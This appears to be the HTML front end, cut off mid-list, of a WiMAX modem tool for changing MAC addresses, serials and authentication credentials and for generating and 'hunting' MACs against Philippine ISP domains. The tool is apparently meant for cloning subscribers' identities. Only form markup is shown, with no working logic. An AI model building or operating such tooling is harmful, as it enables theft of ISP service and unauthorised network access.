<td class="tabs tabs1" id="tab1" onclick="selPanel(1)">MAC Changer</td>
<td class="tabs tabs0" id="tab2" onclick="selPanel(2)">MAC Gen/Hunter</td>
<td class="tabs tabs0" id="tab3" onclick="selPanel(3)">MAC Table/List</td>
<td class="tabs tabs0" id="tab4" onclick="selPanel(4)">Password Utility</td>
<td class="tabs tabs0" id="tab5" onclick="selPanel(5)">Tool Settings</td>
<td class="tabs tabs0" id="tab6" onclick="selPanel(6)">IP Scanner</td>
</tr>
</table>
<div cellpadding="0" class="panel" id ="panel1">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC and Security Changer</b><input style="display:none" type="text" style="border: 1px solid #000000; width: 328px; font-size: 10; height: 21px; line-height:17px;" id="scanId" name="scanId" value="V2lNYXggVG9vbCBWMy4wIFtTY3JpcHQgYnk6IHl5eXh5eXl6XQ==" readonly></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<center>
<label title ="Change MAC using REBOOT method."><input type="radio" id ="radioBtnReboot" name="ChangeMacOption" value="REBOOT" checked  onclick ="Vbscript:ChangingMacButtonOption"/><span style="font-size: 12;
color: White; font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">REBOOT</span></label>
<label>&nbsp;&nbsp;</label><label title ="Change MAC using RESTORE DEFAULT method."> <input type="radio" id ="radioBtnRestore" name="ChangeMacOption" value="RESTORE" onclick ="Vbscript:ChangingMacButtonOption"/><span style="font-size: 12; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">RESTORE</span></label>
</center>
<div title="Change MAC here" style="margin-left: 8px; margin-bottom: 2px; margin-top: 2px;border-bottom:solid 1px white;padding-bottom:5px;margin-right: 8px;">
<span style="font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC Add.: &nbsp;</b></span>
<input type="text" style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="20" name="inputChangeMacOne"
onkeyup="VBScript:GetPassAndDomainPass" onkeydown="" 
onclick="VBScript:GetPassAndDomainPass" tabindex="1" value="Enter MAC here" title="Note: CAREFULLY enter MAC address.">
<label title ="Click to Paste."><input  type="button" tabindex="3" name="btnPasteChangeMacOnly" value=" Paste "
onclick="VBScript:PasteTextChangeMacOnly" class="btn"></label>
<label  title = "Load the current MAC of the device."><input type="checkbox" id="chkLoadMyMAC" name ="chkLoadMyMAC"  onclick="VBScript:LoadMyMacAddress" /><span id="chkLoadMyMACLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Load my device MAC?&nbsp;</span></label>
<!--Begin serial-->
<div style="height: 5px;">
<!--comment-->
</div>
<span style="font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Serial #N.: &nbsp;</b></span>
<input type="text" style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="26" name="inputChangeSerial"
value="Enter Serial here" title="Note: CAREFULLY enter Serial Number.">
<label title ="Click to Paste."><input  type="button"  name="btnPasteChangeSerial" value=" Paste "
onclick="VBScript:PasteTextChangeSerial" class="btn"></label>
<label  title = "Check to Allow Change Serial."><input type="checkbox" id="chkEnableChangeSerial" name ="chkEnableChangeSerial"  onclick="VBScript:EnableDisableChangeSerial" /><span id="chkChangeSerialLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Change Serial?&nbsp;</span></label>
<!--End serial-->
<div style=" margin-left: 70px;margin-top: 5px;">
<input type="button" tabindex="3" name="changeMacOneOnly" value="Change MAC"
onclick="VBScript:ChangeMacTest" class="btn" title=" &#8226; Click to change MAC address.&#013; &#8226;  NOTE: Double check  the given MAC address.">
<input title ="Click to visit WebAdmin." type="button" name="btnWebAdmin" value="WebAdmin" onclick="VBScript:GoToWebAdmin" class="btn">
<input title ="Click fix 622 2010 and below Enable WEB GUI." type="button" id="btnWebGUI" name="btnWebGUI" value="Fix 622" onclick="VBScript:EnableWeb622" class="btn">
</div>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Frequency:&nbsp; </b></span>
<select style=" font-size: 12; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="drpDwnFrequency"
name="drpDwnFrequency" onchange="" >
<option value="2507500">2507500 Khz</option>
<option value="2602000">2602000 Khz</option>
<option value="2612000">2612000 Khz</option>
<option value="2638000">2638000 Khz</option>
<option value="2622000">2622000 Khz</option>
<option value="2505000">2505000 Khz</option>
<option value="2510000">2510000 Khz</option>
<option value="Allglobe">ALL-G Khz</option>
<option value="2337500">2337500-S Khz</option>
<option value="2347500">2347500-S Khz</option>
<option value="2357500">2357500-S* Khz</option>
<option value="2345000">2345000-S Khz</option>
<option value="2355000">2355000-S Khz</option>
<option value="2365000">2365000-S Khz</option>
<option value="Allsmart">ALL-S Khz</option>
</select>
<span style="font-size: 12; color: White; font-weight: normal; margin-left: 8px;
font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;"><b></b></span>
<input title =" &#8226; Click to set device frequency.&#013; &#8226;  NOTE: Requires Device MAC address." type="button" id="btnSetFrequency" name="btnSetFrequency" value="Set Device Frequency" onclick="VBScript:ChangeFrequencyOnlyBtn" class="btn">
</div>
<div id ="bm622OptionRestore" title=" &#8226; Change Wimax Security (NAI,USERID,DOMAIN).&#013; &#8226; MAC is REQUIRED!" style="display:none;margin-left: 8px;margin-right: 8px; margin-bottom: 5px;  border-bottom: solid 1px white; padding-top:5px; padding-bottom:5px;">
<span style="font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Stable MAC Add.: &nbsp;</b></span>
<input type="text" disabled  style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px; line-height: 16px;" size="22" name="inputChangeMacOneStable"
onkeyup="VBScript:OnkeyUpInputStableMac622" onkeydown="VBScript:OnkeyUpInputStableMac622" 
onclick="VBScript:OnClicInputStableMac622"  value="Enter Stable MAC here" title="Note: CAREFULLY enter stable MAC address.">
<label  title = "Check to enable MAC Fusion"><input type="checkbox" id="chkBxStableMAC" name ="chkBxStableMAC" onclick="VBScript:EnableFusion" /><span id="chkBxStableMACLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Enable MAC Fusion&nbsp;</span></label>
</div>
<div id ="hideSecurity" title=" &#8226; Change Wimax Security (NAI,USERID,DOMAIN).&#013; &#8226; MAC is REQUIRED!" style="margin-left: 8px;margin-right: 8px; margin-bottom: 2px;  border-bottom:solid 1px white;padding-top: 0px; padding-bottom: 0px;">
<span style="font-size: 12; color: White; font-weight: normal;
font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;"><b>Wimax Security Settings: (customizable)</b></span><br>
<label style ="margin-left: 60px;" title = " &#8226; Check to allow N.A.I. changes.&#013; &#8226; Un-check to deny N.A.I. changes."><input type="checkbox" id="chkAllowNai" name ="chkAllowNai" checked onclick="VBScript:GetChkAllowNai" /><span id ="chkAllowNaiLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Change N.A.I.?&nbsp;</span></label>
<label style ="margin-left: 15px;" title = " &#8226; Check to enable TLS Authentication.&#013; &#8226; Un-check to disable TLS Authentication.Use TTLS"><input type="checkbox" id="chkEnableTLS" name ="chkEnableTLS"  onclick="VBScript:GeChkEnableTLS" /><span id ="chkEnableTLSLabel"style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Enable TLS?&nbsp;</span></label>
<label style ="margin-left: 15px;" title = " &#8226; Check to use OLD MAC series pass generator.&#013; &#8226; Un-check to use 622m MAC series pass generator."><input type="checkbox" id="chkEnable622mType" name ="chkEnable622mType" checked  onclick="VBScript:GetChkEnable622mType" /><span id ="chkEnable622mTypeLabel"style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;OLD MAC?&nbsp;</span></label>
<br>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="dispclay: inline-block; width: 60px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>NAI:</b></span>
<input type="text" style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="22" name="inputNai"
tabindex="" value="Enter NAI here" title="Edit to change NAI." >
<select style=" font-size: 12; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="drpDwnNaiDomain"
name="drpDwnNaiDomain" onchange="" >
<option value="@globelines.com.ph">@globelines.com.ph</option>
<option value="@huawei.com">@huawei.com</option>
<option value="@globetel.com.ph">@globetel.com.ph</option>
<option value="@innove.com.ph">@innove.com.ph</option>
<option value="@smartbro.net">@smartbro.net</option>
</select>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 60px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>UserId:</b></span>
<input type="text" style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="22" name="inputUserId"
tabindex="1" value="Enter UserId here" title="Edit to change UserId.">
<select style="font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="drpDwnUserIdDomain"
name="drpDwnUserIdDomain" onchange="">
<option value="@globelines.com.ph">@globelines.com.ph</option>
<option value="@huawei.com">@huawei.com</option>
<option value="@globetel.com.ph">@globetel.com.ph</option>
<option value="@innove.com.ph">@innove.com.ph</option>
<option value="@smartbro.net">@smartbro.net</option>
</select><br>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 60px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Password:</b></span>
<input type="text" style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="22" name="inputDomainPassword"
tabindex="1" value="Enter Password here" title="Edit to change Password.">
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="webUiAdminPassword"
value="" >
<input type="button" tabindex="3" name="btnChangeSecurity" value="Change Security"
onclick="VBScript:ChangeSecurityOnlyBtn" class="btn" title=" &#8226; Click to change SECURITY ONLY.&#013; &#8226; MAC address is REQUIRED!">
<div style="height: 5px;">
<!--comment-->
</div>
</div>
<span style="font-size: 12; color: White; font-weight: normal; margin-left: 8px;
font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;"><b>Log status:</b></span><br>
<textarea style="padding-left: 5px; margin-left:10px;margin-right:10px;height: 100px; width: 100%; font-size: 10; color: green; background-color: #000000;
font-weight: normal; margin-bottom: 10px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" title="Change MAC log area"
name="changeMACLog" rows="35" cols="100" readonly>Status idle....</textarea>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding:4px;">
<center>
<input title ="Click to exit the tool." type="button" value=" Exit " onclick="VBScript:CloseWindow" class="MenuBtn">
<input title ="Restore default settings." type="reset" value="Clear All" onclick="VBScript:ClearRestoreChangeMac" class="MenuBtn">
<input title ="Click to Test Download Speed." id ="btnSaveMacInfoSpeed" type="button" value="SpeedTest" onclick="VBScript:SpeedTestCurrentConnection" class="MenuBtn">
<input title ="Click to STOP checking internet." style = "" type="button" value=" STOP! " onclick="VBScript:StopChangeMacOnly" class="MenuBtn">
</center>
</td>
</tr>
</table>
</div>
<div cellpadding="0" class="panel" id="panel2">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC Generator and Hunter</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="margin-left: 8px; margin-bottom: 2px; margin-top: 1px;">
<center>
<label title ="Change MAC using REBOOT method."><input  type="radio" id="SnipeMacOptionReboot" name="SnipeMacOption" value="REBOOT" checked  onclick ="Vbscript:SnipeMacRadioOption"/><span style="font-size: 12;
color: White; font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">REBOOT</span></label>
<label>&nbsp;&nbsp;</label><label  title ="Change MAC using RESTORE DEFAULT method."><input  type="radio" id="SnipeMacOptionRestore" name="SnipeMacOption" value="RESTORE" onclick ="Vbscript:SnipeMacRadioOption"/><span style="font-size: 12; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">RESTORE</span></label>
</center>
<div style="height: 5px;">
<!--comment-->
</div>
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" 
name="hdnStopMacProcess"
value="0" >
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" 
name="hdnStopProcessResult"
value="1" >
<div id ="divDomainSnipe" >
<span style="font-size: 8px; color: White; font-weight: normal;
font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;"></span>
<label title ="Increment/Decrement MAC"><span  style="display: inline-block; width: 65px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Offset by:</b></span>
<select  style="width: 65px; font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="2" size="1"  id="dropDownIncrement"
name="dropDownIncrement" onchange="" >
<optgroup label="Dec">
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="0A">10</option>
<option value="0B">11</option>
<option value="0C">12</option>
<option value="0D">13</option>
<option value="0E">14</option>
<option value="0F">15</option>
<option value="10">16</option>
<option value="11">17</option>
<option value="12">18</option>
<option value="13">19</option>
<option value="14">20</option>
<option value="15">21</option>
<option value="16">22</option>
<option value="17">23</option>
<option value="18">24</option>
<option value="19">25</option>
<option value="1A">26</option>
<option value="1B">27</option>
<option value="1C">28</option>
<option value="1D">29</option>
<option value="1E">30</option>
<option value="1F">31</option>
<option value="20">32</option>
<option value="21">33</option>
<option value="22">34</option>
<option value="23">35</option>
<option value="24">36</option>
<option value="25">37</option>
<option value="26">38</option>
<option value="27">39</option>
<option value="28">40</option>
<option value="29">41</option>
<option value="2A">42</option>
<option value="2B">43</option>
<option value="2C">44</option>
<option value="2D">45</option>
<option value="2E">46</option>
<option value="2F">47</option>
<option value="30">48</option>
<option value="31">49</option>
<option value="32">50</option>
<option value="33">51</option>
<option value="34">52</option>
<option value="35">53</option>
<option value="36">54</option>
<option value="37">55</option>
<option value="38">56</option>
<option value="39">57</option>
<option value="3A">58</option>
<option value="3B">59</option>
<option value="3C">60</option>
<option value="3D">61</option>
<option value="3E">62</option>
<option value="3F">63</option>
<option value="40">64</option>
<option value="41">65</option>
<option value="42">66</option>
<option value="43">67</option>
<option value="44">68</option>
<option value="45">69</option>
<option value="46">70</option>
<option value="47">71</option>
<option value="48">72</option>
<option value="49">73</option>
<option value="4A">74</option>
<option value="4B">75</option>
<option value="4C">76</option>
<option value="4D">77</option>
<option value="4E">78</option>
<option value="4F">79</option>
<option value="50">80</option>
<option value="51">81</option>
<option value="52">82</option>
<option value="53">83</option>
<option value="54">84</option>
<option value="55">85</option>
<option value="56">86</option>
<option value="57">87</option>
<option value="58">88</option>
<option value="59">89</option>
<option value="5A">90</option>
<option value="5B">91</option>
<option value="5C">92</option>
<option value="5D">93</option>
<option value="5E">94</option>
<option value="5F">95</option>
<option value="60">96</option>
<option value="61">97</option>
<option value="62">98</option>
<option value="63">99</option>
<option value="64">100</option>
<option value="65">101</option>
<option value="66">102</option>
<option value="67">103</option>
<option value="68">104</option>
<option value="69">105</option>
<option value="6A">106</option>
<option value="6B">107</option>
<option value="6C">108</option>
<option value="6D">109</option>
<option value="6E">110</option>
<option value="6F">111</option>
<option value="70">112</option>
<option value="71">113</option>
<option value="72">114</option>
<option value="73">115</option>
<option value="74">116</option>
<option value="75">117</option>
<option value="76">118</option>
<option value="77">119</option>
<option value="78">120</option>
<option value="79">121</option>
<option value="7A">122</option>
<option value="7B">123</option>
<option value="7C">124</option>
<option value="7D">125</option>
<option value="7E">126</option>
<option value="7F">127</option>
<option value="80">128</option>
<option value="81">129</option>
<option value="82">130</option>
<option value="83">131</option>
<option value="84">132</option>
<option value="85">133</option>
<option value="86">134</option>
<option value="87">135</option>
<option value="88">136</option>
<option value="89">137</option>
<option value="8A">138</option>
<option value="8B">139</option>
<option value="8C">140</option>
<option value="8D">141</option>
<option value="8E">142</option>
<option value="8F">143</option>
<option value="90">144</option>
<option value="91">145</option>
<option value="92">146</option>
<option value="93">147</option>
<option value="94">148</option>
<option value="95">149</option>
<option value="96">150</option>
<option value="97">151</option>
<option value="98">152</option>
<option value="99">153</option>
<option value="9A">154</option>
<option value="9B">155</option>
<option value="9C">156</option>
<option value="9D">157</option>
<option value="9E">158</option>
<option value="9F">159</option>
<option value="A0">160</option>
<option value="A1">161</option>
<option value="A2">162</option>
<option value="A3">163</option>
<option value="A4">164</option>
<option value="A5">165</option>
<option value="A6">166</option>
<option value="A7">167</option>
<option value="A8">168</option>
<option value="A9">169</option>
<option value="AA">170</option>
<option value="AB">171</option>
<option value="AC">172</option>
<option value="AD">173</option>
<option value="AE">174</option>
<option value="AF">175</option>
<option value="B0">176</option>
<option value="B1">177</option>
<option value="B2">178</option>
<option value="B3">179</option>
<option value="B4">180</option>
<option value="B5">181</option>
<option value="B6">182</option>
<option value="B7">183</option>
<option value="B8">184</option>
<option value="B9">185</option>
<option value="BA">186</option>
<option value="BB">187</option>
<option value="BC">188</option>
<option value="BD">189</option>
<option value="BE">190</option>
<option value="BF">191</option>
<option value="C0">192</option>
<option value="C1">193</option>
<option value="C2">194</option>
<option value="C3">195</option>
<option value="C4">196</option>
<option value="C5">197</option>
<option value="C6">198</option>
<option value="C7">199</option>
<option value="C8">200</option>
<option value="C9">201</option>
<option value="CA">202</option>
<option value="CB">203</option>
<option value="CC">204</option>
<option value="CD">205</option>
<option value="CE">206</option>
<option value="CF">207</option>
<option value="D0">208</option>
<option value="D1">209</option>
<option value="D2">210</option>
<option value="D3">211</option>
<option value="D4">212</option>
<option value="D5">213</option>
<option value="D6">214</option>
<option value="D7">215</option>
<option value="D8">216</option>
<option value="D9">217</option>
<option value="DA">218</option>
<option value="DB">219</option>
<option value="DC">220</option>
<option value="DD">221</option>
<option value="DE">222</option>
<option value="DF">223</option>
<option value="E0">224</option>
<option value="E1">225</option>
<option value="E2">226</option>
<option value="E3">227</option>
<option value="E4">228</option>
<option value="E5">229</option>
<option value="E6">230</option>
<option value="E7">231</option>
<option value="E8">232</option>
<option value="E9">233</option>
<option value="EA">234</option>
<option value="EB">235</option>
<option value="EC">236</option>
<option value="ED">237</option>
<option value="EE">238</option>
<option value="EF">239</option>
<option value="F0">240</option>
<option value="F1">241</option>
<option value="F2">242</option>
<option value="F3">243</option>
<option value="F4">244</option>
<option value="F5">245</option>
<option value="F6">246</option>
<option value="F7">247</option>
<option value="F8">248</option>
<option value="F9">249</option>
<option value="FA">250</option>
<option value="FB">251</option>
<option value="FC">252</option>
<option value="FD">253</option>
<option value="FE">254</option>
<option value="FF">255</option>
</optgroup>
<optgroup label="Hex">
<option value="360">160</option>
<option value="360">260</option>
<option value="360">360</option>
<option value="460">460</option>
<option value="560">560</option>
<option value="660">660</option>
</optgroup>
</optgroup>
<optgroup label="Ran">
<option value="Ran100">100</option>
<option value="Ran200">300</option>
<option value="Ran500">500</option>
<option value="Ran999">999</option>
<option value="Ran9999">9999</option>
</optgroup>
</select></label><label title = " &#8226; Check to INCREMENT MAC.&#013; &#8226; Un-check to DECREMENT MAC."><input type="checkbox" id="chkIncDec" name ="chkIncDec" checked onclick="VBScript:GetChkIncDec" /><span id ="chkIncDecLabel"style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Increment?&nbsp;</span></label>
<span title ="Enter number of MAC to generate." style="display: inline-block;margin-left: 10px;  font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC # to generate:</b></span>
<input type="text" style="padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="2" name="InputMacHowMany"
onkeyup="VBScript:" onkeydown="VBScript:" 
onclick="VBScript:"  value="5" title ="Enter number of MAC to generate.">
<div style="height: 6px;">
<!--comment-->
</div>
<label title ="Select MAC domain"><span id = "spanSnipeDomain" style="display: inline-block; width: 65px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Domain:</b></span>
<select  style=" font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="snipeDomainDropdwnList"
name="snipeDomainDropdwnList" onchange="VBScript:TLSbm622OnlyOnChange" >
<option value="@globelines.com.ph,TTLS">@globelines.com.ph,TTLS</option>
<option value="@globetel.com.ph,TTLS">@globetel.com.ph,TTLS</option>
<option value="@huawei.com,TTLS">@huawei.com,TTLS</option>
<option value="@innove.com.ph,TTLS">@innove.com.ph,TTLS</option>
<option value="combiGH,TTLS">@globelines-huawei,TTLS</option>
<option value="combiGGT,TTLS">@globelines-globetel,TTLS</option>
<option value="combiGTH,TTLS">@globetel-huawei,TTLS</option>
<option value="ALL,TTLS">@Test ALL DOMAIN,TTLS</option>
<option value="@globelines.com.ph,TLS">@globelines.com.ph,TLS</option>
<option value="@globetel.com.ph,TLS">@globetel.com.ph,TLS</option>
<option value="@huawei.com,TLS">@huawei.com,TLS</option>
<option value="@innove.com.ph,TLS">@innove.com.ph,TLS</option>
<option value="ALL,TLS">@Test ALL DOMAIN,TLS</option>
<option value="@smartbro.net,TTLS">@smartbro.net,TTLS</option>
</select></label> <span style="font-size: 8px; color: White; font-weight: normal;
font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;"></span><label  title = " &#8226; Check to allow N.A.I. changes.&#013; &#8226; Un-check to deny N.A.I. changes."><input type="checkbox" id="chkAllowNaiSnipe" name ="chkAllowNaiSnipe" checked onclick="VBScript:GetChkAllowNaiSnipe" /><span id="chkAllowNaiSnipeLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Change N.A.I.?&nbsp;</span></label>
<div style="display: none;">
<label title = " &#8226; Check to enable TLS Authentication.&#013; &#8226; Un-check to disable TLS Authentication.Use TTLS"><input type="checkbox" id="chkEnableTLSSnipe" name ="chkEnableTLSSnipe"  onclick="VBScript:GeChkEnableTLSSnipe" /><span id ="chkEnableTLSSnipeLabel"style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Enable TLS?&nbsp;</span></label>
</div>
<span Title = "Domain use is globelines.com.ph. Means assigned domain in the list will be ignored." id="RestoreOptionSnipeWarning" style="font-size: 11;
color: White; font-weight: normal; background-color:#ff0000;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;NOTE: Domain USE is DEFAULT(globelines.com.ph)&nbsp;</span>
<div style="height: 6px;">
<!--comment-->
</div>
</div>
<label title ="Base MAC to generate"> <span style="display: inline-block; width: 65px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Base MAC:</b></span></label>
<input type="text" style="padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="20" name="InputacAddress"
onkeyup="VBScript:OnKeyUpInputMacAddress" onkeydown="VBScript:OnKeyUpInputMacAddress" 
onclick="VBScript:OnClicInputacAddress" tabindex="1" value="Enter MAC here" title ="Enter / Edit MAC here">
<label title ="Click to Paste."><input  type="button" tabindex="3" name="btnPasteMacSnipe" value=" Paste "
onclick="VBScript:PasteTextSnipe" class="btn"></label>
<span title ="Ending range (6th HEX only) " style="display: none; width: 20px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>To:</b></span>
<select style="display: none; width: 50px; font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="2" size="1" id="dropDownLastHex"
name="dropDownLastHex" onchange="VBScript:inputMacChange">
<option value="">&nbsp;</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="0A">0A</option>
<option value="0B">0B</option>
<option value="0C">0C</option>
<option value="0D">0D</option>
<option value="0E">0E</option>
<option value="0F">0F</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="1A">1A</option>
<option value="1B">1B</option>
<option value="1C">1C</option>
<option value="1D">1D</option>
<option value="1E">1E</option>
<option value="1F">1F</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="2A">2A</option>
<option value="2B">2B</option>
<option value="2C">2C</option>
<option value="2D">2D</option>
<option value="2E">2E</option>
<option value="2F">2F</option>
<option value="30">30</option>
<option value="31">31</option>
<option value="32">32</option>
<option value="33">33</option>
<option value="34">34</option>
<option value="35">35</option>
<option value="36">36</option>
<option value="37">37</option>
<option value="38">38</option>
<option value="39">39</option>
<option value="3A">3A</option>
<option value="3B">3B</option>
<option value="3C">3C</option>
<option value="3D">3D</option>
<option value="3E">3E</option>
<option value="3F">3F</option>
<option value="40">40</option>
<option value="41">41</option>
<option value="42">42</option>
<option value="43">43</option>
<option value="44">44</option>
<option value="45">45</option>
<option value="46">46</option>
<option value="47">47</option>
<option value="48">48</option>
<option value="49">49</option>
<option value="4A">4A</option>
<option value="4B">4B</option>
<option value="4C">4C</option>
<option value="4D">4D</option>
<option value="4E">4E</option>
<option value="4F">4F</option>
<option value="50">50</option>
<option value="51">51</option>
<option value="52">52</option>
<option value="53">53</option>
<option value="54">54</option>
<option value="55">55</option>
<option value="56">56</option>
<option value="57">57</option>
<option value="58">58</option>
<option value="59">59</option>
<option value="5A">5A</option>
<option value="5B">5B</option>
<option value="5C">5C</option>
<option value="5D">5D</option>
<option value="5E">5E</option>
<option value="5F">5F</option>
<option value="60">60</option>
<option value="61">61</option>
<option value="62">62</option>
<option value="63">63</option>
<option value="64">64</option>
<option value="65">65</option>
<option value="66">66</option>
<option value="67">67</option>
<option value="68">68</option>
<option value="69">69</option>
<option value="6A">6A</option>
<option value="6B">6B</option>
<option value="6C">6C</option>
<option value="6D">6D</option>
<option value="6E">6E</option>
<option value="6F">6F</option>
<option value="70">70</option>
<option value="71">71</option>
<option value="72">72</option>
<option value="73">73</option>
<option value="74">74</option>
<option value="75">75</option>
<option value="76">76</option>
<option value="77">77</option>
<option value="78">78</option>
<option value="79">79</option>
<option value="7A">7A</option>
<option value="7B">7B</option>
<option value="7C">7C</option>
<option value="7D">7D</option>
<option value="7E">7E</option>
<option value="7F">7F</option>
<option value="80">80</option>
<option value="81">81</option>
<option value="82">82</option>
<option value="83">83</option>
<option value="84">84</option>
<option value="85">85</option>
<option value="86">86</option>
<option value="87">87</option>
<option value="88">88</option>
<option value="89">89</option>
<option value="8A">8A</option>
<option value="8B">8B</option>
<option value="8C">8C</option>
<option value="8D">8D</option>
<option value="8E">8E</option>
<option value="8F">8F</option>
<option value="90">90</option>
<option value="91">91</option>
<option value="92">92</option>
<option value="93">93</option>
<option value="94">94</option>
<option value="95">95</option>
<option value="96">96</option>
<option value="97">97</option>
<option value="98">98</option>
<option value="99">99</option>
<option value="9A">9A</option>
<option value="9B">9B</option>
<option value="9C">9C</option>
<option value="9D">9D</option>
<option value="9E">9E</option>
<option value="9F">9F</option>
<option value="A0">A0</option>
